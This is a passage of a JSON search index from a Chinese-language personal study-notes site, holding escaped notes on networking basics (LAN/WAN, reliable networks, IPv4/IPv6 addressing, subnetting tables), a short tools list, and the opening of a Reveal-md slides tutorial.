<li>\u8fc7\u7a0b\u63d0\u4f9b\u7684\u662f\u901a\u8fc7\u7f51\u7edc\u5f15\u5bfc\u548c\u79fb\u52a8\u6d88\u606f\u7684\u529f\u80fd\u3002\u8fc7\u7a0b\u4e0d\u6613\u5bdf\u89c9\uff0c\u4f46\u5374\u662f\u7f51\u7edc\u8fd0\u884c\u7684\u5173\u952e\u3002</li> </ul>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/#_6","title":"\u7f51\u7edc\u8868\u793a\u65b9\u5f0f","text":"<p>\u7f51\u7edc\u56fe\u901a\u5e38\u4f7f\u7528\u7b26\u53f7\u6765\u8868\u793a\u6784\u6210\u7f51\u7edc\u7684\u4e0d\u540c\u8bbe\u5907\u548c\u8fde\u63a5\uff0c\u5173\u4e8e\u672c\u8bfe\u7a0b\u7684\u7b26\u53f7\u89c4\u8303\u6027\uff0c\u53ef\u4ee5\u67e5\u770b Cisco \u7684 Icon Glossary \u6587\u6863</p> <p></p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u8981\u6ce8\u610f\u51e0\u4e2a\u5e38\u7528\u5230\u7684\u4e13\u6709\u540d\u8bcd\uff1a</p> <ul> <li>\u7f51\u7edc\u63a5\u53e3\u5361 NIC (Network Interface Card)<ul> <li>\u5373\u6211\u4eec\u5e38\u8bf4\u7684\u7f51\u5361\uff0c\u7528\u4e8e\u63d0\u4f9b\u4e0e\u7f51\u7edc\u4e4b\u95f4\u7684\u7269\u7406\u8fde\u63a5\uff0c\u5305\u62ec\u6709\u7ebf\u7f51\u5361\u548c\u65e0\u7ebf\u7f51\u5361</li> </ul> </li> <li>\u7aef\u53e3 Port<ul> <li>\u7f51\u7edc\u8bbe\u5907\u4e0a\u7684\u63a5\u53e3\u6216\u63d2\u53e3\uff0c\u4ecb\u8d28\u901a\u8fc7\u5b83\u8fde\u63a5\u5230\u7ec8\u7aef\u8bbe\u5907\u6216\u5176\u4ed6\u7f51\u7edc\u8bbe\u5907</li> </ul> </li> <li>\u63a5\u53e3 Interface<ul> <li>\u7f51\u7edc\u8bbe\u5907\u4e0a\u8fde\u63a5\u5230\u72ec\u7acb\u7f51\u7edc\u7684\u4e13\u7528\u7aef\u53e3</li> <li>\u4f8b\u5982\u8def\u7531\u5668\u7684\u7aef\u53e3\u5c31\u79f0\u4e3a\u7f51\u7edc\u63a5\u53e3</li> </ul> </li> </ul> <p>\u901a\u5e38 \u7aef\u53e3 \u548c \u63a5\u53e3 \u53ef\u4ee5\u6df7\u7528</p> <p>\u5bf9\u4e8e\u7814\u7a76\u7f51\u7edc\u7684\u4eba\u6765\u8bf4\uff0c\u901a\u5e38\u4f7f\u7528\u7f51\u7edc\u62d3\u6251\u56fe\u67e5\u770b\u76f4\u89c2\u7684\u7f51\u7edc\u8fde\u63a5\u60c5\u51b5\u3002</p> <ul> <li>\u7269\u7406\u62d3\u6251\u56fe - \u8bc6\u522b\u8bbe\u5907\u548c\u7535\u7f06\u5b89\u88c5\u7684\u7269\u7406\u4f4d\u7f6e<ul> <li>\u7269\u7406\u62d3\u6251\u56fe\u8bb0\u5f55\u5404\u53f0\u4e3b\u673a\u73b0\u5b9e\u4e2d\u7684\u4f4d\u7f6e\u5173\u7cfb\u53ca\u5176\u4e0e\u7f51\u7edc\u8fde\u63a5\u7684\u65b9\u5f0f</li> <li></li> </ul> </li> <li>\u903b\u8f91\u62d3\u6251\u56fe - \u8bc6\u522b\u8bbe\u5907\u3001 \u7aef\u53e3\u548c\u5730\u5740\u7684\u903b\u8f91\u65b9\u6848<ul> <li>\u903b\u8f91\u62d3\u6251\u56fe\u5bf9\u4e3b\u673a\u8fdb\u884c\u5206\u7ec4\u7684\u4f9d\u636e\u662f\u5b83\u4eec\u4f7f\u7528/\u8bbf\u95ee\u7f51\u7edc\u7684\u65b9\u5f0f\uff0c\u800c\u4e0d\u8003\u8651\u5b83\u4eec\u7684\u7269\u7406\u4f4d\u7f6e\u3002\u4e3b\u673a\u540d\u79f0\u3001 IP\u5730\u5740\u3001\u7ec4\u4fe1\u606f\u548c\u5e94\u7528\u7a0b\u5e8f\uff08\u5373\u670d\u52a1\u5668\u8f6f\u4ef6\uff09 \u90fd\u53ef\u8bb0\u5f55\u5728\u903b\u8f91\u62d3\u6251\u56fe\u4e2d</li> <li></li> </ul> </li> </ul> \u4e00\u70b9\u5c0f\u6d4b\u9a8c <p></p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/#_7","title":"\u5e38\u89c1\u7f51\u7edc\u7c7b\u578b","text":"<p>\u6211\u4eec\u751f\u6d3b\u4e2d\u6700\u5e38\u7528\u7684\u7f51\u7edc\u7c7b\u578b\u6709\u4e24\u79cd\uff0c\u5206\u522b\u662f\u5c40\u57df\u7f51 LAN \u548c\u5e7f\u57df\u7f51 WAN</p> <p>\u5c40\u57df\u7f51\u662f\u4e3a\u8f83\u5c0f\u5730\u7406\u533a\u57df\u5185\u7684\u7528\u6237\u548c\u7ec8\u7aef\u8bbe\u5907\u63d0\u4f9b\u8bbf\u95ee\u7684\u7f51\u7edc\u57fa\u7840\u8bbe\u65bd\uff0c\u901a\u5e38\u662f\u7531\u4e2a\u4eba\u6216 IT \u90e8\u95e8\u62e5\u6709\u5e76\u7ba1\u7406\u7684\u4f01\u4e1a\u3001\u5bb6\u5ead\u6216\u5c0f\u578b\u4f01\u4e1a\u7f51\u7edc\uff1b\u5e7f\u57df\u7f51\u662f\u4e3a\u5e7f\u6cdb\u5730\u7406\u533a\u57df\u5185\u7684\u7f51\u7edc\u63d0\u4f9b\u8bbf\u95ee\u7684\u7f51\u7edc\u57fa\u7840\u8bbe\u65bd\uff0c\u901a\u5e38\u7531\u901a\u4fe1\u670d\u52a1\u63d0\u4f9b\u5546 (SP) \u62e5\u6709\u5e76\u7ba1\u7406\u3002</p> <p>\u591a\u4e2a\u4e0d\u540c\u7684 LAN \u7531 WAN \u8fde\u63a5\u8d77\u6765\u76f8\u4e92\u901a\u4fe1</p> <p>\u5176\u4e2d\u65e0\u7ebf\u5c40\u57df\u7f51 WLAN \u662f\u672c\u8bfe\u7a0b\u7684\u5b9e\u9a8c\u91cd\u70b9</p> <p>\u6bd4\u5e7f\u57df\u7f51\u66f4\u4e0a\u5c42\u7684\u7f51\u7edc\u5c31\u662f\u4e92\u8054\u7f51 (Internet) \u3002Internet \u662f\u4e00\u4e2a\u4e92\u8fde\u7f51\u7edc\u7684\u5168\u7403\u96c6\u5408\uff0c\u591a\u4e2a LAN \u901a\u8fc7 WAN \u8fde\u63a5\u800c\u4e92\u8054\uff0c\u7136\u540e WAN \u518d\u5f7c\u6b64\u8fde\u63a5\u4e0b\u53bb\u3002Internet \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e2a\u4eba\u6216\u56e2\u4f53\uff0c\u4f46\u6709 IETF \u3001ICANN \u7b49\u7ec4\u7ec7\u5bf9\u5176\u8fdb\u884c\u7ef4\u62a4\u3002</p> <p>\u4e0e\u672f\u8bed\u201c\u4e92\u8054\u7f51\u201d\u7c7b\u4f3c\uff0c\u4f46\u6709\u533a\u522b\u7684\u53e6\u5916\u4e24\u4e2a\u672f\u8bed\uff1a</p> <ul> <li>\u5185\u90e8\u7f51 Intranet<ul> <li>\u901a\u5e38\u7528\u4e8e\u8868\u793a\u4e00\u4e2a\u7ec4\u7ec7\u7684\u79c1\u6709\u5c40\u57df\u7f51\u548c\u5e7f\u57df\u7f51\u8fde\u63a5\uff0c\u53ea\u6709\u8be5\u7ec4\u7ec7\u7684\u6210\u5458\u3001\u5458\u5de5\u6216\u5176\u4ed6\u83b7\u5f97\u6388\u6743\u7684\u4eba\u5458\u53ef\u4ee5\u8bbf\u95ee</li> </ul> </li> <li>\u5916\u8054\u7f51 Extranet<ul> <li>\u7ec4\u7ec7\u53ef\u4ee5\u4f7f\u7528\u5916\u8054\u7f51\u4e3a\u5728\u5176\u4ed6\u7ec4\u7ec7\u5de5\u4f5c\u4f46\u9700\u8981\u672c\u7ec4\u7ec7\u6570\u636e\u7684\u4eba\u63d0\u4f9b\u5b89\u5168\u8bbf\u95ee</li> </ul> </li> </ul>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E5%BD%93%E4%BB%8A%E7%BD%91%E7%BB%9C/#_8","title":"\u53ef\u9760\u7f51\u7edc","text":"<p>\u4e00\u4e2a\u53ef\u9760\u7f51\u7edc\uff0c\u9700\u8981\u5177\u5907\u4ee5\u4e0b\u56db\u79cd\u7279\u6027\u624d\u80fd\u6ee1\u8db3\u7528\u6237\u7684\u671f\u671b\uff1a</p> <ul> <li>\u5bb9\u9519\u80fd\u529b<ul> <li>\u6709\u591a\u6761\u8def\u5f84\u5230\u8fbe\u76ee\u7684\u5730\u88ab\u79f0\u4e3a\u5197\u4f59\u3002 \u5982\u679c\u4e00\u6761\u8def\u5f84\u5931\u8d25\uff0c \u6d88\u606f\u53ef\u4ee5\u7acb\u5373\u901a\u8fc7\u5176\u4ed6\u5197\u4f59\u7684\u5907\u4efd\u94fe\u8def\u53d1\u9001\uff0c \u4ece\u800c\u5b9e\u73b0\u5feb\u901f\u6062\u590d</li> </ul> </li> <li>\u53ef\u62d3\u5c55\u6027<ul> <li>\u53ef\u6269\u5c55\u7684\u7f51\u7edc\u80fd\u8fc5\u901f\u6269\u5f20\u4ee5\u652f\u6301\u65b0\u589e\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\uff0c \u540c\u65f6\u8fd8\u4fdd\u8bc1\u4e1d\u6beb\u4e0d\u4f1a\u5f71\u54cd\u4e3a\u73b0\u6709\u7528\u6237\u63d0\u4f9b\u670d\u52a1</li> </ul> </li> <li>\u670d\u52a1\u8d28\u91cf QoS<ul> <li>QoS \u901a\u8fc7\u914d\u7f6e\u6765\u4e3a\u4e0d\u540c\u7c7b\u578b\u7684\u670d\u52a1\u63d0\u4f9b\u4e0d\u540c\u7684\u4f18\u5148\u7ea7</li> <li>\u5982\u4f18\u5148\u5904\u7406\u6d41\u5a92\u4f53\uff0c\u800c\u7f51\u9875\u5219\u53ef\u4ee5\u63a5\u53d7\u8f83\u4f4e\u4f18\u5148\u7ea7</li> </ul> </li> <li>\u5b89\u5168\u6027<ul> <li>\u673a\u5bc6\u6027\u00a0- \u6570\u636e\u673a\u5bc6\u6027\u610f\u5473\u7740\u53ea\u6709\u9884\u5b9a\u548c\u6388\u6743\u6536\u4ef6\u4eba\u53ef\u4ee5\u8bbf\u95ee\u5e76\u8bfb\u53d6\u6570\u636e\u3002</li> <li>\u5b8c\u6574\u6027\u00a0- \u6570\u636e\u5b8c\u6574\u6027\u8868\u793a\u4fdd\u8bc1\u4fe1\u606f\u5728\u4ece\u6e90\u5230\u76ee\u7684\u5730\u7684\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u88ab\u66f4\u6539\u3002</li> <li>\u53ef\u7528\u6027\u00a0- \u6570\u636e\u53ef\u7528\u6027\u8868\u793a\u4fdd\u8bc1\u6388\u6743\u7528\u6237\u53ca\u65f6\u53ef\u9760\u5730\u8bbf\u95ee\u6570\u636e\u670d\u52a1\u3002</li> </ul> </li> </ul>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E7%BD%91%E7%BB%9C%E5%AF%BB%E5%9D%80/","title":"\u7f51\u7edc\u5bfb\u5740","text":""},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E7%BD%91%E7%BB%9C%E5%AF%BB%E5%9D%80/#_1","title":"\u7f51\u7edc\u5bfb\u5740","text":"<p> \u7ea6 1272 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E7%BD%91%E7%BB%9C%E5%AF%BB%E5%9D%80/#ip","title":"IP \u5730\u5740\u548c\u5b50\u7f51\u63a9\u7801","text":"<p>IP \u5730\u5740\u662f\u7528\u4e8e\u6807\u8bc6\u7279\u5b9a\u4e3b\u673a\u7684\u903b\u8f91\u5730\u5740\uff0c\u4e3a\u4e86\u4e0e Internet \u4e0a\u5176\u5b83\u8bbe\u5907\u901a\u4fe1\uff0c\u5b83\u5fc5\u987b\u552f\u4e00\u3001\u4e0d\u51b2\u7a81</p> <p>\u6bcf\u4e2a\u7f51\u5361NIC\u90fd\u6709\u5404\u81ea\u7684 IP \u5730\u5740</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E7%BD%91%E7%BB%9C%E5%AF%BB%E5%9D%80/#ipv4","title":"IPv4","text":"<p>IP \u5730\u5740\u662f\u4e00\u4e2a 32 \u4f4d\u4e8c\u8fdb\u5236 01 \u4e32\uff0c\u4ee5\u516b\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u5212\u5206\u4e3a\u56db\u4e2a\u516b\u4f4d\u5b57\u8282\uff0c\u6bcf\u4e2a\u5b57\u8282\u4ee5\u5341\u8fdb\u5236\u6570\u8868\u793a\uff0c\u4e2d\u95f4\u7528\u70b9\u53f7\u5206\u5272\uff0c\u5373 \u70b9\u5206\u5341\u8fdb\u5236\u8bb0\u6cd5</p> <p>IP \u5730\u5740\u5177\u6709\u5c42\u6b21\u6027\uff0c\u524d\u9762\u90e8\u5206\u6807\u8bc6\u4e3b\u673a\u6240\u5728\u7684\u7f51\u7edc\uff0c\u540e\u9762\u90e8\u5206\u6807\u8bc6\u8be5\u7f51\u7edc\u4e2d\u7279\u5b9a\u7684\u4e3b\u673a\u3002\u4e24\u90e8\u5206\u7684\u4f4d\u6570\u5bf9\u4e8e\u4e0d\u540c\u7528\u9014\u6709\u7740\u4e0d\u540c\u5206\u914d\uff0c\u5b50\u7f51\u63a9\u7801\u7528\u6765\u8868\u660e IP \u5730\u5740\u4e2d\uff0c\u54ea\u4e00\u90e8\u5206\u4ee3\u8868\u7f51\u7edc\uff0c\u54ea\u4e00\u90e8\u5206\u4ee3\u8868\u4e3b\u673a\uff1aIP \u4e0e\u5b50\u7f51\u63a9\u7801\u6309\u4f4d\u4e0e\u64cd\u4f5c\uff0c\u6240\u5f97\u7684\u90e8\u5206\u5373\u4e3a\u7f51\u7edc\u90e8\u5206</p> <p>Example</p> <p>\u4f8b\u5982 IP \u5730\u5740 192.169.1.100 \u4e0e\u5176\u5b50\u7f51\u63a9\u7801 255.255.255.0 </p> <p>\u5176\u7f51\u7edc\u90e8\u5206\u4e3a 192.169.1 \uff0c\u4e3b\u673a\u90e8\u5206\u4e3a 100</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528\u524d\u7f00\u957f\u5ea6\u7684\u65b9\u5f0f\u8868\u793a\u5b50\u7f51\u63a9\u7801\uff0c\u5373 \"/\" \u540e\u7d27\u8ddf\u7740\u4e3a 1 \u7684\u4f4d\u6570\u3002\u5982\u4e0a\u4f8b\u4e2d IP \u5730\u5740\u53ca\u5176\u5b50\u7f51\u63a9\u7801\u53ef\u4ee5\u8868\u793a\u4e3a <code>192.169.1.100/24</code></p> <p>\u4f46\u662f\u9700\u8981\u6ce8\u610f\uff0c\u4e3b\u673a\u90e8\u5206\u5168\u90e8\u4e3a 0 \u7684 IP \u5730\u5740\u662f\u8be5\u7f51\u7edc\u7684\u7f51\u7edc\u5730\u5740\uff1b\u4e3b\u673a\u90e8\u5206\u5168\u90e8\u4e3a 1 \u7684 IP \u5730\u5740\u662f\u8be5\u7f51\u7edc\u7684\u5e7f\u64ad\u5730\u5740\u3002\u8fd9\u4e24\u4e2a\u5730\u5740\u4e0d\u80fd\u5206\u914d\u7ed9\u5177\u4f53\u7684\u4e3b\u673a\u3002</p> <p>\u6240\u4ee5\u8ba1\u7b97\u5b50\u7f51\u63a9\u7801\u5bf9\u5e94\u7f51\u7edc\u53ef\u5b58\u5728\u4e3b\u673a\u6570\u91cf\u65f6\uff0c\u8981\u51cf\u53bb 2</p> <p>IPv4 \u5730\u5740\u53ef\u4ee5\u5206\u4e3a\u4e94\u7c7b\uff0c\u5176\u4e2d A\u3001B\u3001C \u7c7b\u662f\u5546\u4e1a\u7c7b\u7528\u9014\uff0c\u53ef\u5206\u914d\u4e3b\u673a\uff1bD \u7c7b\u4ec5\u4fdd\u7559\u4f9b\u7ec4\u64ad\u4f7f\u7528\uff1bE \u7c7b\u4fdd\u7559\u7528\u4e8e\u5b9e\u9a8c\u7528\u9014\u3002</p> <p></p> <p>\u4e3a\u4e86\u5ef6\u7f13 IPv4 \u5730\u5740\u8017\u5c3d\uff0c\u7ec4\u7ec7\u5185\u90e8\u53ef\u4ee5\u4f7f\u7528\u79c1\u6709\u5730\u5740\u8fdb\u884c\u901a\u4fe1\uff0c\u4f46\u662f\u79c1\u6709\u5730\u5740\u4e0d\u80fd\u8fde\u63a5 Internet \uff0c\u9700\u8981\u7ecf\u8fc7\u7f51\u7edc\u5730\u5740\u8f6c\u6362\uff08NAT\uff09\u53d8\u6210\u5171\u6709\u5730\u5740\u624d\u80fd\u5728 Internet \u901a\u4fe1\u3002</p> <ul> <li>\u501f\u52a9 NAT \uff0c\u53ef\u5c06\u4f20\u51fa\u6570\u636e\u5305\u7684\u79c1\u6709\u6e90 IP \u5730\u5740\u8f6c\u6362\u4e3a\u516c\u6709\u6e90 IP \u5730\u5740</li> <li>\u501f\u52a9 NAT \uff0c\u53ef\u5c06\u4f20\u5165\u6570\u636e\u5305\u7684\u516c\u6709\u76ee\u7684 IP \u5730\u5740\u8f6c\u6362\u4e3a\u79c1\u6709\u76ee\u7684 IP \u5730\u5740</li> </ul> <p>RFC 1918 \u89c4\u5b9a\u79c1\u6709\u5730\u5740\u53ef\u53d6\u7684\u8303\u56f4\u5982\u4e0b\uff1a</p> <p></p> <p>\u65e0\u7ebf\u8def\u7531\u5668\u7684 WAN \u53e3\u4e00\u822c\u662f\u516c\u6709\u5730\u5740\uff0cLAN \u53e3\u662f\u79c1\u6709\u5730\u5740\uff0c\u56e0\u6b64\u5b83\u4eec\u7684 IP \u5730\u5740\u5fc5\u987b\u5c5e\u4e8e\u4e0d\u540c\u7f51\u7edc\uff0c\u5373 \u7f51\u7edc\u90e8\u5206\u4e0d\u540c\u3002</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E7%BD%91%E7%BB%9C%E5%AF%BB%E5%9D%80/#ipv6","title":"IPv6","text":"<p>IPv4 \u5730\u5740\u65e9\u57282011\u5e742\u6708\u5c31\u88ab ICANN \u5206\u914d\u6b86\u5c3d\uff0c\u6211\u4eec\u9700\u8981\u66f4\u5927\u7684\u5730\u5740\u7a7a\u95f4\uff01</p> <p>IPv6 \u5730\u5740\u662f\u4e00\u4e2a 128 \u4f4d\u7684\u4e8c\u8fdb\u5236\u6570\u503c\uff0c\u4e00\u822c\u4ee5 32 \u4e2a 16 \u8fdb\u5236\u6570\u5b57\u8868\u793a\uff0c\u5176\u4e00\u822c\u683c\u5f0f\u4e3a\uff1a<code>xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx</code></p> <ul> <li>\u5b57\u6bb5\u4e2d\u7684\u524d\u5bfc 0 \u53ef\u4ee5\u7701\u7565\uff0c\u4f8b\u5982 09C0 \u53ef\u5199\u4f5c 9C0</li> <li>\u8fde\u7eed\u7684\u96f6\u5b57\u6bb5\u53ef\u8868\u793a\u4e3a :: \uff0c\u4f46\u6bcf\u4e2a\u5730\u5740\u53ea\u80fd\u7528\u4e00\u6b21 ::</li> </ul> <p>\u793a\u4f8b\uff1a</p> <ul> <li>0:0:0:0:0:0:0:1 \u8868\u793a\u4e3a ::1 \uff0c\u5373 localhost</li> <li>2031:0000:130F:0000:0000:09C0:876A:130B<ul> <li>\u53ef\u8868\u793a\u4e3a 2031:0:130F::9C0:876A:130B</li> </ul> </li> </ul> <p>IPv6 \u4f7f\u7528\u524d\u7f00\u957f\u5ea6\u8868\u793a\u5730\u5740\u7684\u524d\u7f00\u90e8\u5206\uff08\u76f8\u5f53\u4e8e\u7f51\u7edc\u90e8\u5206\uff09\uff0c\u5178\u578b\u7684\u524d\u7f00\u957f\u5ea6\u4e3a /64 \u3002\u5269\u4f59\u90e8\u5206\u7edf\u79f0\u4e3a\u63a5\u53e3 ID \uff08\u76f8\u5f53\u4e8e\u4e3b\u673a\u90e8\u5206\uff09</p> <p>\u5982 2001:DB8:A::/64</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/%E7%BD%91%E7%BB%9C%E5%AF%BB%E5%9D%80/#_2","title":"\u5b50\u7f51\u5212\u5206","text":"<p>\u521b\u5efa IPv4 \u5b50\u7f51\u7684\u65f6\u5019\u4f1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u4e3b\u673a\u4f4d\u4f5c\u4e3a\u7f51\u7edc\u4f4d\uff0c\u5177\u4f53\u505a\u6cd5\u662f\u5ef6\u957f\u5b50\u7f51\u63a9\u7801\uff0c\u4ece\u5730\u5740\u7684\u4e3b\u673a\u90e8\u5206\u501f\u7528\u82e5\u5e72\u4f4d\u6765\u589e\u52a0\u7f51\u7edc\u4f4d\u3002</p> <p>\u501f\u7528\u7684\u4e3b\u673a\u4f4d\u8d8a\u591a\uff0c\u53ef\u4ee5\u5b9a\u4e49\u7684\u5b50\u7f51\u4e5f\u5c31\u8d8a\u591a\u3002\u4e3a\u4e86\u589e\u52a0\u5b50\u7f51\u6570\u91cf\u800c\u501f\u7528\u7684\u4f4d\u8d8a\u591a\uff0c\u6bcf\u4e2a\u5b50\u7f51\u7684\u4e3b\u673a\u6570\u91cf\u5c31\u8d8a\u5c11\u3002</p> <p>\u5047\u8bbe\u4f01\u4e1a\u9009\u62e9\u4e86\u79c1\u6709\u5730\u5740 10.0.0.0/8 \u4f5c\u4e3a\u5176\u5185\u90e8\u7f51\u7edc\u5730\u5740\u3002\u8be5\u7f51\u7edc\u5730\u5740\u53ef\u4ee5\u5728\u4e00\u4e2a\u5e7f\u64ad\u57df\u4e2d\u8fde\u63a5 16,777,214 \u4e2a\u4e3b\u673a\u3002\u663e\u7136\uff0c\u5728\u4e00\u4e2a\u5b50\u7f51\u4e0a\u62e5\u6709\u8d85\u8fc7 1600 \u4e07\u53f0\u4e3b\u673a\u5e76\u4e0d\u7406\u60f3\u3002</p> <p>\u4f01\u4e1a\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5728\u4e8c\u8fdb\u5236\u516b\u4f4d\u7ec4\u8fb9\u754c /16 \u5904\u5bf9 10.0.0.0/8 \u5730\u5740\u8fdb\u884c\u5b50\u7f51\u5212\u5206\uff0c\u5982\u8868\u6240\u793a\u3002\u8fd9\u80fd\u8ba9\u4f01\u4e1a\u5b9a\u4e49\u591a\u8fbe 256 \u4e2a\u5b50\u7f51\uff08\u4f8b\u5982\uff0c10.0.0.0/16 \u2013 10.255.0.0/16\uff09\uff0c\u6bcf\u4e2a\u5b50\u7f51\u53ef\u4ee5\u8fde\u63a5 65,534 \u4e2a\u4e3b\u673a\u3002\u6ce8\u610f\uff0c\u524d\u4e24\u4e2a\u4e8c\u8fdb\u5236\u516b\u4f4d\u7ec4\u6807\u8bc6\u5730\u5740\u7684\u7f51\u7edc\u90e8\u5206\uff0c\u800c\u540e\u4e24\u4e2a\u4e8c\u8fdb\u5236\u516b\u4f4d\u7ec4\u7528\u4e8e\u6807\u8bc6\u4e3b\u673a IP \u5730\u5740\u3002</p> \u5b50\u7f51\u5730\u5740  (256 \u4e2a\u53ef\u80fd\u7684\u5b50\u7f51) \u4e3b\u673a\u8303\u56f4  \uff08\u6bcf\u4e2a\u5b50\u7f51\u53ef\u80fd\u6709 65,534 \u4e2a\u4e3b\u673a\uff09 \u5e7f\u64ad 10.0.0.0/16 10.0.0.1 -\u00a010.0.255.254 10.0.255.255 10.1.0.0/16 10.1.0.1 -\u00a010.1.255.254 10.1.255.255 10.2.0.0/16 10.2.0.1 -\u00a010.2.255.254 10.2.255.255 10.3. 0.0/16 10.3.0.1 -\u00a010.3.255.254 10.3.255.255 10.4.0.0/16 10.4.0.1 -\u00a010.4.255.254 10.4.255.255 10.5.0.0/16 10.5.0.1 -\u00a010.5.255.254 10.5.255.255 10.6.0.0/16 10.6.0.1 -\u00a010.6.255.254 10.6.255.255 10.7.0.0/16 10.7.0.1 -\u00a010.7.255.254 10.7.255.255 ... ... ... 10.255.0.0/16 10.255.0.1 -\u00a010.255.255.254 10.255.255.255 <p>\u53e6\u5916\uff0c\u66f4\u52a0\u5e7f\u6cdb\u4f7f\u7528\u7684\u662f /24 \u8fb9\u754c\uff0c\u8fd9\u5c06\u8ba9\u4f01\u4e1a\u80fd\u5b9a\u4e49 65,536 \u4e2a\u5b50\u7f51\uff0c\u6bcf\u4e2a\u5b50\u7f51\u80fd\u8fde\u63a5 254 \u4e2a\u4e3b\u673a\u3002</p> \u5b50\u7f51\u5730\u5740  (65,536 \u4e2a\u53ef\u80fd\u7684\u5b50\u7f51) \u4e3b\u673a\u8303\u56f4  \uff08\u6bcf\u4e2a\u5b50\u7f51\u53ef\u80fd\u6709 254 \u4e2a\u4e3b\u673a\uff09 \u5e7f\u64ad 10.0.0.0/24 10.0.0.1 -\u00a010.0.0.254 10.0.0.255 10.0.1.0/24 10.0.1.1 -\u00a010.0.1.254 10.0.1.255 10.0.2.0/24 10.0.2.1 -\u00a010.0.2.254 10.0.2.255 \u2026 \u2026 \u2026 10.0.255.0/24 10.0.255.1 -\u00a010.0.255.254 10.0.255.255 10.1.0.0/24 10.1.0.1 -\u00a010.1.0.254 10.1.0.255 10.1.1.0/24 10.1.1.1 -\u00a010.1.1.254 10.1.1.255 10.1.2.0/24 10.1.2.1 -\u00a010.1.2.254 10.1.2.255 \u2026 \u2026 \u2026 10.100.0.0/24 10.100.0.1 -\u00a010.100.0.254 10.100.0.255 ... ... ... 10.255.255.0/24 10.255.255.1 -\u00a010.2255.255.254 10.255.255.255 <p>/24 \u7f51\u7edc\u5730\u5740\u901a\u5e38\u901a\u8fc7\u4ece\u7b2c 4 \u4e2a\u4e8c\u8fdb\u5236\u516b\u4f4d\u6570\u501f\u7528\u4f4d\u6765\u4f7f\u7528\u66f4\u957f\u7684\u524d\u7f00\u8fdb\u884c\u5b50\u7f51\u5212\u5206\u3002\u8fd9\u53ef\u4ee5\u8ba9\u7ba1\u7406\u5458\u5728\u5c06\u7f51\u7edc\u5730\u5740\u5206\u914d\u5230\u66f4\u5c11\u6570\u91cf\u7684\u7ec8\u7aef\u8bbe\u5907\u65f6\u5177\u6709\u5f88\u597d\u7684\u7075\u6d3b\u6027\u3002</p> <p>\u53c2\u8003\u4e0b\u8868\u53ef\u4ee5\u770b\u52306\u79cd\u5bf9/24\u7f51\u7edc\u5212\u5206\u5b50\u7f51\u7684\u65b9\u5f0f\u3002</p> <p></p>"},{"location":"Techniques/","title":"index","text":""},{"location":"Techniques/#index","title":"index","text":"<p> \u7ea6 48 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Techniques/#_1","title":"\u4e00\u4e9b\u5999\u5999\u5de5\u5177","text":"<ul> <li>\u7f16\u89e3\u7801 CyberChef</li> <li>\u5728\u7ebf\u7f16\u8bd1\u5668 Compiler Explorer</li> <li>\u8bc6\u522b Latex \u7b26\u53f7 Detexify</li> <li>\u6570\u636e\u7ed3\u6784\u3001\u7b97\u6cd5\u6a21\u62df Data Structure Visualization</li> <li>\u624b\u7ed8\u98ce\u683c\u4f5c\u56fe Excalidraw</li> <li>\u7f51\u9875\u5b58\u6863 Web Archive</li> </ul>"},{"location":"Techniques/Reveal-md/","title":"Reveal-md","text":""},{"location":"Techniques/Reveal-md/#reveal-md-slides","title":"\u4f7f\u7528 Reveal-md \u5199 Slides","text":"<p> \u7ea6 475 \u4e2a\u5b57  27 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Quote</p> <p>\u53d7\u5230\u77ed\u5b66\u671f\u8bfe\u7a0b CTF \u5f71\u54cd\uff0c\u6211\u4e5f\u5bf9 Reveal-md \u5199 Sldes \u7684\u65b9\u5f0f\u4ea7\u751f\u4e86\u8f83\u5927\u5174\u8da3\uff0c\u56e0\u6b64\u53c2\u8003\u4fee\u4f6c\u7684\u6559\u7a0b\u5199\u4e86\u7bc7\u81ea\u7528\u7684\u7b14\u8bb0</p> <p>\u6211\u5199\u7684\u4e00\u4e2a\u7b80\u964b\u6d4b\u8bd5 Slides\uff1a \ud83d\udd17</p>"},{"location":"Techniques/Reveal-md/#_1","title":"\u7b80\u4ecb","text":"<p><code>reveal-js</code> \u662f\u4e00\u4e2a\u5f00\u6e90\u7684 HTML \u8868\u73b0\u6846\u67b6\u3002\u8fd9\u662f\u4e00\u4e2a\u5de5\u5177\uff0c\u4f7f\u5f97\u4efb\u4f55\u4eba\u53ef\u4ee5\u5728 Web \u521b\u5efa\u529f\u80fd\u9f50\u5168\uff0c\u7f8e\u4e3d\u7684 Slides\u3002</p> <p>\u800c <code>reveal-md</code> 